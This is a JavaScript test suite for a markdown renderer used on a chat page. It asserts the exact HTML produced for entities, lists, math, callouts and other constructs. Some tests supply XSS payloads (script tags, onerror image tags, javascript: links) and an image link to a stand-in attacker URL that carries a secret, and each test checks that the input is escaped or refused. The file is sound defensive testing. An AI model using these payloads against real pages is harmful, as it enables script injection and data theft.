// Verification for site/assets/md.js — one assertion per construct the
// renderer gained (entities, backslash escapes, setext headings, indented
// code, hard breaks, the sub/sup/kbd allowlist, angle autolinks, inline and
// display math, nested lists) plus the XSS ordering trio this renderer's
// safety rests on and the invariants it must never regress (the fence walker
// and the absence of isJsonShaped).
//
//   node --test site/assets/md.test.mjs
//
// The /chat page and every /install/* recipe render through this file, and
// /chat renders text a model wrote, so every case below is an output-shape
// assertion, not a smoke test: it says exactly which bytes come back.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { renderMd } from './md.js';
// The ratio helper is a .ts module and `node` cannot load it directly; `test:root` runs this file with
// plain `node --test`, so tsx is registered at runtime and the helper is dynamic-imported (top-level
// await is fine in an .mjs module). One shared ratio rule, never a second copy.
import { register } from 'tsx/esm/api';
register();
const { growthOver, describeGrowth } = await import('../../edge/test/lib/growth.js');

const md = (s) => String(renderMd(s));

// ---------------------------------------------------------------- entities
test('entity: &amp; renders as the & character, never double-encoded', () => {
  assert.equal(md('&amp;'), '<p>&amp;</p>');
  assert.ok(!md('&amp;').includes('&amp;amp;'), 'no double escape');
});

test('entity: a raw & stays safe and displays as &', () => {
  assert.equal(md('Tom & Jerry'), '<p>Tom &amp; Jerry</p>');
});

test('entity: named and numeric references decode', () => {
  assert.equal(md('&mdash;'), '<p>—</p>');
  assert.equal(md('&#8212;'), '<p>—</p>');
  assert.equal(md('&#x2014;'), '<p>—</p>');
  assert.equal(md('a&nbsp;b'), '<p>a\u00A0b</p>');
  assert.equal(md('&hellip;'), '<p>…</p>');
});

test('entity: an unknown reference stays literal text', () => {
  assert.equal(md('&foo;'), '<p>&amp;foo;</p>');
  assert.equal(md('&#0;'), '<p>&amp;#0;</p>');
});

// ------------------------------------------------------- THE XSS ORDERING —
// decode THEN escape. The three cases the unit was told to prove, verbatim.
test('XSS 1: input &amp; renders the & character', () => {
  const html = md('&amp;');
  assert.equal(html, '<p>&amp;</p>');
});

test('XSS 2: input <script> renders escaped text', () => {
  const html = md('<script>alert(1)</script>');
  assert.equal(html, '<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>');
  assert.ok(!html.includes('<script'), 'no script element');
});

test('XSS 3: input &lt;script&gt; also renders escaped text, never an element', () => {
  const html = md('&lt;script&gt;alert(1)&lt;/script&gt;');
  assert.equal(html, '<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>');
  assert.ok(!html.includes('<script'), 'decoded markup is re-escaped, never emitted');
});

test('XSS: a decoded entity is never re-scanned as markup', () => {
  assert.equal(md('&lt;b&gt;bold&lt;/b&gt;'), '<p>&lt;b&gt;bold&lt;/b&gt;</p>');
  assert.equal(md('&amp;lt;b&amp;gt;'), '<p>&amp;lt;b&amp;gt;</p>');
});

// ------------------------------------------------------- backslash escapes
test('backslash: \\* is a literal star, not emphasis', () => {
  const html = md('\\*not italic\\*');
  assert.equal(html, '<p>*not italic*</p>');
  assert.ok(!html.includes('<i>'), 'no italic span');
});

test('backslash: escapes the block markers too', () => {
  assert.equal(md('\\# not a heading'), '<p># not a heading</p>');
  assert.equal(md('\\- not a list'), '<p>- not a list</p>');
});

test('backslash: an escaped ampersand is a literal &, still escaped for output', () => {
  assert.equal(md('\\&'), '<p>&amp;</p>');
});

// ------------------------------------------------------------ setext heads
test('setext: Title + === is an h1, Title + --- an h2', () => {
  assert.equal(md('Title\n==='), '<h1 class="h h1">Title</h1>');
  assert.equal(md('Title\n---'), '<h2 class="h h2">Title</h2>');
});

test('setext: a --- with no paragraph over it is still a rule', () => {
  assert.equal(md('---'), '<hr/>');
});

// --------------------------------------------------------- indented code
test('indented code: a four-space line is a code block', () => {
  const html = md('    a = 1\n    b = 2');
  assert.ok(html.includes('class="code"'), 'code card');
  assert.ok(html.includes('<pre><code>'), 'pre/code');
  assert.ok(html.includes('a =') && html.includes('b ='), 'body preserved');
  assert.ok(!html.includes('<p>'), 'not a paragraph');
});

test('indented code: an indented line under a paragraph stays prose', () => {
  const html = md('prose\n    still prose');
  assert.ok(html.startsWith('<p>'), 'lazy continuation, not code');
});

// ------------------------------------------------------------- hard breaks
test('hard break: a trailing backslash ends the line without printing itself', () => {
  assert.equal(md('line one\\\nline two'), '<p>line one<br/>line two</p>');
});

test('hard break: a literal <br> is a break', () => {
  assert.equal(md('a<br>b'), '<p>a<br/>b</p>');
  assert.equal(md('a<br/>b'), '<p>a<br/>b</p>');
});

// ------------------------------------------------- sub / sup / kbd allowlist
test('allowlist: sub, sup and kbd render as tags', () => {
  assert.equal(md('<sub>2</sub>'), '<p><sub>2</sub></p>');
  assert.equal(md('<sup>3</sup>'), '<p><sup>3</sup></p>');
  assert.equal(md('<kbd>⌘K</kbd>'), '<p><kbd>⌘K</kbd></p>');
});

test('allowlist: every other tag stays escaped literal text', () => {
  assert.equal(md('<b>bold</b>'), '<p>&lt;b&gt;bold&lt;/b&gt;</p>');
  assert.equal(md('<sub class="x">a</sub>'), '<p>&lt;sub class=&quot;x&quot;&gt;a&lt;/sub&gt;</p>');
  assert.equal(md('<sub><b>x</b></sub>'), '<p>&lt;sub&gt;&lt;b&gt;x&lt;/b&gt;&lt;/sub&gt;</p>');
});

// ------------------------------------------------------------ angle autolink
test('autolink: <https://…> becomes a link, href escaped', () => {
  const html = md('<https://example.com/a?b=1&c=2>');
  assert.ok(html.includes('<a href="https://example.com/a?b=1&amp;c=2"'), 'href escaped');
  assert.ok(html.includes('target="_blank"'), 'web link opens beside the page');
  assert.ok(html.includes('referrerpolicy="no-referrer"'), 'no referrer');
});

test('autolink: a non-http tag is untouched text', () => {
  assert.ok(!md('<img src=x onerror=alert(1)>').includes('<img'), 'raw img never reaches the DOM');
  assert.equal(md('<div>hi</div>'), '<p>&lt;div&gt;hi&lt;/div&gt;</p>');
});

// --------------------------------------------------------------------- math
test('math: inline $…$ becomes an escaped md-math span', () => {
  assert.equal(md('$E=mc^2$'), '<p><span class="md-math">\\(E=mc^2\\)</span></p>');
});

test('math: \\(…\\) is inline math too', () => {
  assert.equal(md('\\(a+b\\)'), '<p><span class="md-math">\\(a+b\\)</span></p>');
});

test('math: $$…$$ on one line is a display block', () => {
  assert.equal(md('$$x^2$$'), '<div class="md-math-block">\\[x^2\\]</div>');
});

test('math: a $$ opener line closes on its own line', () => {
  assert.equal(md('$$\nx^2\n$$'), '<div class="md-math-block">\\[x^2\\]</div>');
});

test('math: a \\[ … \\] block works, and streaming keeps it', () => {
  assert.equal(md('\\[\na\n\\]'), '<div class="md-math-block">\\[a\\]</div>');
  assert.equal(md('$$\nx^2'), '<div class="md-math-block">\\[x^2\\]</div>');
});

test('math: the price rule — $5 and $10 stay prose', () => {
  assert.equal(md('$5 and $10'), '<p>$5 and $10</p>');
  assert.ok(!md('costs $5, was $10').includes('md-math'), 'no math span from prices');
});

test('math: TeX is escaped, so < never becomes a tag', () => {
  assert.equal(md('$a<b$'), '<p><span class="md-math">\\(a&lt;b\\)</span></p>');
});

// -------------------------------------------------------------- nested list
test('list: an indented marker nests inside the item above it', () => {
  assert.equal(md('- a\n  - b\n- c'), '<ul><li>a<ul><li>b</li></ul></li><li>c</li></ul>');
});

test('list: ordered markers produce <ol>, and a type switch splits the list', () => {
  assert.equal(md('1. a\n2. b'), '<ol><li>a</li><li>b</li></ol>');
  assert.equal(md('- a\n1. b'), '<ul><li>a</li></ul><ol><li>b</li></ol>');
});

test('list: a two-level ordered list nests in order', () => {
  assert.equal(md('1. a\n   1. b\n2. c'), '<ol><li>a<ol><li>b</li></ol></li><li>c</li></ol>');
});

// ------------------------------------------------------- regressions kept
test('fence walker: a 4-backtick fence quotes a 3-backtick block as body', () => {
  const html = md('````\n```\ninner\n```\n````');
  assert.ok(html.includes('inner'), 'body preserved');
  assert.equal((html.match(/class="code"/g) ?? []).length, 1, 'the whole thing is ONE code card');
  assert.ok(!html.includes('crsr'), 'closed, so no streaming cursor');
});

test('fence walker: a 3-space-indented opener and a detail info string', () => {
  const html = md('   ```js title="x"\nlet a = 1;\n   ```');
  assert.ok(html.includes('js title=&quot;x&quot;'), 'info string kept as the label');
  assert.ok(!html.includes('crsr'), 'closer at 3 spaces closes it');
});

test('fence walker: an unterminated fence streams with a cursor, not prose', () => {
  assert.ok(md('```js\nconst a = 1;').includes('crsr'), 'cursor in the label bar');
  assert.ok(md('```').includes('class="code"'), 'a bare opener already opens the card');
});

test('no isJsonShaped: bracket-only runs stay paragraphs', () => {
  assert.equal(md('[a]'), '<p>[a]</p>');
  assert.equal(md('[1, 2]'), '<p>[1, 2]</p>');
  assert.equal(md('{"a":1}'), '<p>{&quot;a&quot;:1}</p>');
});

test('code span: entities inside inline code are literal, not decoded', () => {
  assert.equal(md('`&amp;`'), '<p><code>&amp;amp;</code></p>');
});

test('links and images keep their allowlists', () => {
  assert.ok(md('[t](https://example.com)').includes('<a href="https://example.com"'), 'https link renders');
  assert.ok(!md('[t](javascript:alert(1))').includes('<a href="javascript:'), 'javascript: refused');
  assert.ok(!md('![x](https://attacker.example/collect?d=SECRET)').includes('<img'), 'remote img refused');
  assert.ok(md('![g](/gen/abc.png)').includes('<img src="/gen/abc.png"'), 'same-origin img renders');
});

test('blockquote, table and headings still render', () => {
  assert.equal(md('> hi'), '<blockquote>hi</blockquote>');
  assert.equal(md('&gt; hi'), '<p>&gt; hi</p>');
  assert.equal(md('# H'), '<h1 class="h h1">H</h1>');
  assert.ok(md('a | b\n--- | ---\n1 | 2').includes('<div class="tbl">'), 'table renders');
});

test('bold and italic still render', () => {
  assert.equal(md('**b**'), '<p><b>b</b></p>');
  assert.equal(md('*i*'), '<p><i>i</i></p>');
});
// ------------------------------------------------------- ordered list start
// The sibling parsers swallowed an ordered run that followed a nested bullet
// list; this renderer already split them (listHtml switches kind per level),
// so the only half of that defect present here was the DROPPED START: a list
// written from 3 painted from 1. The start now reaches the markup.
test('list: an ordered list after a nested bullet run keeps its own start', () => {
  assert.equal(
    md('- level one\n  - level two\n    - level three\n\n3. third\n4. fourth\n5. fifth'),
    '<ul><li>level one<ul><li>level two<ul><li>level three</li></ul></li></ul></li></ul><ol start="3"><li>third</li><li>fourth</li><li>fifth</li></ol>',
  );
});

test('list: a non-1 ordered start reaches the markup; 1 and bullets do not', () => {
  assert.equal(md('5. five'), '<ol start="5"><li>five</li></ol>');
  assert.equal(md('1. a\n2. b'), '<ol><li>a</li><li>b</li></ol>');
  assert.equal(md('1. a\n- b'), '<ol><li>a</li></ol><ul><li>b</li></ul>');
  assert.equal(md('1. a\n  - b\n1. c'), '<ol><li>a<ul><li>b</li></ul></li><li>c</li></ol>');
});

// ---------------------------------------------------- alerts and <details>
test('alert: [!TAG] first quote line renders an escaped callout aside', () => {
  assert.equal(
    md('> [!note]\n> body **b**'),
    '<aside class="callout callout-note" role="note" aria-label="Note"><p class="callout-title">Note</p><p>body <b>b</b></p></aside>',
  );
  assert.equal(
    md('> [!WARNING] <i>x</i>\n> y'),
    '<aside class="callout callout-warning" role="note" aria-label="&lt;i&gt;x&lt;/i&gt;"><p class="callout-title">&lt;i&gt;x&lt;/i&gt;</p><p>y</p></aside>',
  );
  assert.equal(md('> [!DANGER]\n> x'), '<blockquote>[!DANGER]<br/>x</blockquote>', 'an unknown tag stays a quote');
});

test('details: summary, open, markdown body with fences, balancing close', () => {
  const html = md('<details open>\n<summary>Why *this*</summary>\n\nBody\n\n```js\n</details>\n```\n<details><summary>In</summary>x</details>\n</details>\nafter');
  assert.ok(html.startsWith('<details class="md-details" open><summary class="md-details-summary">Why <i>this</i></summary><div class="md-details-body"><p>Body</p>'));
  assert.ok(html.includes('<code>&lt;/details&gt;</code>'), 'a closer inside a fence is code');
  assert.ok(html.includes('<details class="md-details"><summary class="md-details-summary">In</summary><div class="md-details-body"><p>x</p></div></details>'));
  assert.ok(html.endsWith('</div></details><p>after</p>'));
});

test('details: unclosed runs to the end, no summary reads Details, summary tags escaped', () => {
  assert.equal(md('<details>\nrest'), '<details class="md-details"><summary class="md-details-summary">Details</summary><div class="md-details-body"><p>rest</p></div></details>');
  assert.ok(md('<details><summary><img src=x onerror=1></summary>b</details>').includes('&lt;img src=x onerror=1&gt;'));
});

// ------------------------------------------------- key facts (==x==, `mark`)
// A client that advertises the `mark` cap gets `==key fact==` from the model;
// this renderer draws it as <mark class="kf"> (the stylesheet gives it the accent
// ink, semibold, no background) and never prints the four `=`.
test('key fact: a real pair renders as <mark class="kf"> holding the words', () => {
  assert.equal(md('The date is ==Oct 1, 2027== ok'), '<p>The date is <mark class="kf">Oct 1, 2027</mark> ok</p>');
  assert.equal(md('x ==a== y ==b== z'), '<p>x <mark class="kf">a</mark> y <mark class="kf">b</mark> z</p>');
});

test('key fact: the words are escaped, so markup in a pair is text', () => {
  const html = md('==<img src=x onerror=1>==');
  assert.equal(html, '<p><mark class="kf">&lt;img src=x onerror=1&gt;</mark></p>');
  assert.ok(!html.includes('<img'), 'no element');
});

test('key fact: bold nests either way round, a link and a link label read inside it', () => {
  assert.equal(md('**==b==** and ==**c**=='), '<p><b><mark class="kf">b</mark></b> and <mark class="kf"><b>c</b></mark></p>');
  assert.ok(md('==see [docs](https://x.example/a) now==').startsWith('<p><mark class="kf">see <a href="https://x.example/a"'));
  assert.ok(md('[a ==b== c](https://x.example/z)').includes('>a <mark class="kf">b</mark> c</a>'));
});

test('key fact: a comparison, a ruler, a half pair and an escape print as written', () => {
  assert.equal(md('a == b and x === y'), '<p>a == b and x === y</p>');
  assert.equal(md('x==y==z'), '<p>x==y==z</p>');
  assert.equal(md('==a==b'), '<p>==a==b</p>');
  assert.equal(md('== a =='), '<p>== a ==</p>');
  assert.equal(md('if x==1 and y==2 then'), '<p>if x==1 and y==2 then</p>');
  assert.equal(md('\\==x=='), '<p>==x==</p>');
  assert.equal(md('====\n'), '<p>====</p>');
});

test('key fact: a code span, a fence and a URL keep their ==', () => {
  assert.equal(md('use `==x==` and ==real=='), '<p>use <code>==x==</code> and <mark class="kf">real</mark></p>');
  const fence = md('```\n==x==\n```');
  assert.ok(fence.includes('==x==') && !fence.includes('<mark'), fence);
  const url = md('[l](https://x.example/==a==) ok');
  assert.ok(url.includes('href="https://x.example/==a=="') && !url.includes('<mark'), url);
});

test('key fact: a pair never ends inside an attribute the link rule minted', () => {
  const html = md('==see [a](https://x.example/?q==&b) now==');
  assert.ok(!/href="[^"]*<\/?mark/.test(html), html);
});

test('key fact: linear on a line of openers with no closer', () => {
  // LOAD ARTIFACT: each run's work grows with its repeat count, so each is measured as an Nx growth
  // ratio between two sizes, never against a fixed ms budget — a wall-clock cap measures the box's load,
  // not the code. The regression that survives: a quadratic scan of these opener runs took minutes at
  // 50k units, so 10x the units cost ~100x and trips the ratio bound (or the 1000 ms backstop, which
  // fails a runaway whatever its ratio). Sizes are per witness; the floor is lowered to 2 ms because the
  // ==a==b run reads ~3 ms on the 50k body, just under the 4 ms default, and would otherwise pass vacuously.
  const WITNESSES = [
    ['==a run, no closer', (n) => '==a '.repeat(n), [10_000, 100_000]],
    ['==a==b run', (n) => '==a==b '.repeat(n), [5_000, 50_000]],
  ];
  for (const [label, make, sizes] of WITNESSES) {
    const g = growthOver((s) => md(s), make, sizes, { noiseFloorMs: 2 });
    assert.ok(g.linear, `${label}: stays linear: ${describeGrowth(g, 'small', 'large')}`);
  }
});
